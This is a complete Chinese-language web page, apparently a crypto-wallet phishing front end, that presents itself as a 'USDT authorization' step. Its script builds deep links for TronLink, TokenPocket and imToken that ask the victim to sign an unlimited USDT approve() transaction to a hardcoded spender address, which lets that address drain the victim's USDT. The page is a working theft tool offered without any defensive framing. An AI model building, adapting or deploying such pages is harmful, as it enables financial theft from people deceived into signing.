<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>多链钱包授权 - USDT无限授权</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 24px;
            padding: 24px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            color: #333;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
        }
        
        .chain-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
        
        .chain-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            background: white;
            border-radius: 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .chain-btn.active {
            border-color: #667eea;
            background: #f0f0ff;
            color: #667eea;
        }
        
        .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            background: white;
        }
        
        .wallet-item.selected {
            border-color: #667eea;
            background: #f8f9ff;
        }
        
        .wallet-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 4px;
        }
        
        .wallet-chains {
            font-size: 12px;
            color: #999;
        }
        
        .approve-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .approve-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 16px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
        }
        
        .status.loading {
            background: #fff3cd;
            color: #856404;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .download-prompt {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: #333;
            color: white;
            padding: 16px;
            border-radius: 16px;
            text-align: center;
            animation: slideUp 0.3s ease;
            z-index: 1000;
        }
        
        .download-prompt a {
            color: #667eea;
            text-decoration: underline;
            margin-left: 8px;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">选择链和钱包，授权 USDT 无限额度</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
                <button class="chain-btn" data-chain="728126428">TRON</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div style="background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px;">
                <div style="font-size: 12px; color: #666;">授权地址</div>
                <div style="font-size: 12px; color: #333; word-break: break-all;">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                <div style="font-size: 12px; color: #666; margin-top: 8px;">授权额度</div>
                <div style="font-size: 14px; color: #667eea; font-weight: 600;">无限额度</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">授权 USDT</button>
            <div class="status hidden" id="status"></div>
        </div>
    </div>
    
    <div id="downloadPrompt" class="download-prompt hidden"></div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
    <script>
        // ==================== 配置 ====================
        const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // TRON 钱包配置（带 DApp 协议参数）
        const tronWallets = {
            tronlink: {
                name: 'TronLink',
                icon: '🌊',
                scheme: 'tronlink://',
                dappScheme: (params) => `tronlink://dapp?action=sign&data=${encodeURIComponent(JSON.stringify(params))}`,
                download: {
                    ios: 'https://apps.apple.com/app/tronlink/id1514876309',
                    android: 'https://play.google.com/store/apps/details?id=com.tronlinkapp.wallet',
                    fallback: 'https://www.tronlink.org/'
                }
            },
            tokenpocket: {
                name: 'TokenPocket',
                icon: '🎫',
                scheme: 'tp://',
                dappScheme: (params) => `tp://wallet/transact?data=${encodeURIComponent(JSON.stringify(params))}`,
                download: {
                    ios: 'https://apps.apple.com/app/tokenpocket/id1389003581',
                    android: 'https://play.google.com/store/apps/details?id=com.vpaly.tokenpocket',
                    fallback: 'https://www.tokenpocket.pro/'
                }
            },
            imtoken: {
                name: 'imToken',
                icon: '🔷',
                scheme: 'imtokenv2://',
                dappScheme: (params) => `imtokenv2://ethereum?action=sign&data=${encodeURIComponent(JSON.stringify(params))}`,
                download: {
                    ios: 'https://apps.apple.com/app/imtoken/id1384798940',
                    android: 'https://play.google.com/store/apps/details?id=im.token.app',
                    fallback: 'https://token.im/'
                }
            }
        };
        
        let currentChain = '728126428';
        let selectedWallet = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function showDownloadPrompt(wallet) {
            const prompt = document.getElementById('downloadPrompt');
            const downloadUrl = getDownloadUrl(wallet);
            prompt.innerHTML = `
                未检测到 ${wallet.name}<br>
                <a href="${downloadUrl}" target="_blank" style="color: #667eea;">点击下载钱包</a>
                <span style="margin-left: 12px; cursor: pointer;" onclick="closeDownloadPrompt()">✕</span>
            `;
            prompt.classList.remove('hidden');
            setTimeout(() => closeDownloadPrompt(), 5000);
        }
        
        function closeDownloadPrompt() {
            document.getElementById('downloadPrompt').classList.add('hidden');
        }
        
        function getDownloadUrl(wallet) {
            const ua = navigator.userAgent;
            if (/iPhone|iPad/i.test(ua)) return wallet.download.ios;
            if (/Android/i.test(ua)) return wallet.download.android;
            return wallet.download.fallback;
        }
        
        function isMobile() {
            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        }
        
        // ==================== 构造 TRON 授权交易参数 ====================
        function buildTronApproveParams() {
            // 构造调用 USDT 合约 approve 方法的参数
            // 使用 TronWeb 的合约调用格式
            const contractAddress = TRON_USDT_CONTRACT;
            const functionSelector = 'approve(address,uint256)';
            
            // 参数：授权地址（需要去掉 TRC20 地址格式转换）
            // TronLink 期望的参数格式
            const parameter = [
                { type: 'address', value: SPENDER_ADDRESS },
                { type: 'uint256', value: UNLIMITED_AMOUNT }
            ];
            
            return {
                contractAddress: contractAddress,
                functionSelector: functionSelector,
                parameter: parameter,
                callValue: 0,
                feeLimit: 100000000 // 10 TRX 作为手续费上限
            };
        }
        
        // ==================== 唤起钱包并授权 ====================
        async function openWallet() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            const chainId = parseInt(currentChain);
            
            if (chainId !== 728126428) {
                showStatus('EVM 链开发中，请先测试 TRON 链', 'error');
                return;
            }
            
            const wallet = tronWallets[selectedWallet];
            if (!wallet) {
                showStatus('请选择 TRON 链钱包', 'error');
                return;
            }
            
            showStatus(`正在构造授权交易...`, 'loading');
            
            // 构造授权参数
            const approveParams = buildTronApproveParams();
            
            // 根据钱包类型生成不同的唤起链接
            let deepLink;
            if (selectedWallet === 'tronlink') {
                // TronLink 使用 DApp 协议
                deepLink = `tronlink://dapp?action=sign&data=${encodeURIComponent(JSON.stringify(approveParams))}&callback=${encodeURIComponent(window.location.href)}`;
            } else if (selectedWallet === 'tokenpocket') {
                // TokenPocket 的交易签名协议
                deepLink = `tp://wallet/transact?data=${encodeURIComponent(JSON.stringify({
                    contract: TRON_USDT_CONTRACT,
                    method: 'approve',
                    params: [SPENDER_ADDRESS, UNLIMITED_AMOUNT],
                    callback: window.location.href
                }))}`;
            } else if (selectedWallet === 'imtoken') {
                // imToken 的 TRON 协议
                deepLink = `imtokenv2://tron/transact?to=${TRON_USDT_CONTRACT}&data=${encodeURIComponent(JSON.stringify({
                    method: 'approve',
                    params: [SPENDER_ADDRESS, UNLIMITED_AMOUNT]
                }))}&callback=${encodeURIComponent(window.location.href)}`;
            } else {
                deepLink = wallet.scheme;
            }
            
            console.log('唤起链接:', deepLink);
            
            showStatus(`正在唤起 ${wallet.name}...`, 'loading');
            
            // 跳转到钱包
            window.location.href = deepLink;
            
            // 记录待处理状态
            localStorage.setItem('pendingTronApprove', 'true');
            localStorage.setItem('selectedTronWallet', selectedWallet);
            localStorage.setItem('approveParams', JSON.stringify(approveParams));
            
            // 2.5秒后如果还在页面，提示下载
            setTimeout(() => {
                if (!document.hidden && !document.webkitHidden) {
                    hideStatus();
                    showDownloadPrompt(wallet);
                }
            }, 2500);
        }
        
        // ==================== 渲染钱包列表 ====================
        function renderWalletList() {
            const container = document.getElementById('walletList');
            container.innerHTML = Object.entries(tronWallets).map(([key, wallet]) => `
                <div class="wallet-item" data-wallet="${key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                        <div class="wallet-chains">TRON</div>
                    </div>
                </div>
            `).join('');
            
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                });
            });
        }
        
        // ==================== 初始化 ====================
        function init() {
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentChain = btn.dataset.chain;
                    selectedWallet = null;
                    
                    if (parseInt(currentChain) === 728126428) {
                        renderWalletList();
                        showStatus('TRON 链已就绪，选择钱包后点击授权', 'success');
                        setTimeout(() => hideStatus(), 2000);
                    } else {
                        document.getElementById('walletList').innerHTML = '<div style="text-align:center;padding:20px;color:#999;">EVM 链开发中</div>';
                        showStatus('EVM 链开发中，请先测试 TRON 链', 'error');
                        setTimeout(() => hideStatus(), 2000);
                    }
                });
            });
            
            document.querySelector('.chain-btn[data-chain="728126428"]').classList.add('active');
            document.getElementById('approveBtn').addEventListener('click', openWallet);
            renderWalletList();
            showStatus('TRON 链已就绪，选择钱包后点击授权', 'success');
            setTimeout(() => hideStatus(), 2000);
        }
        
        init();
    </script>
</body>
</html>
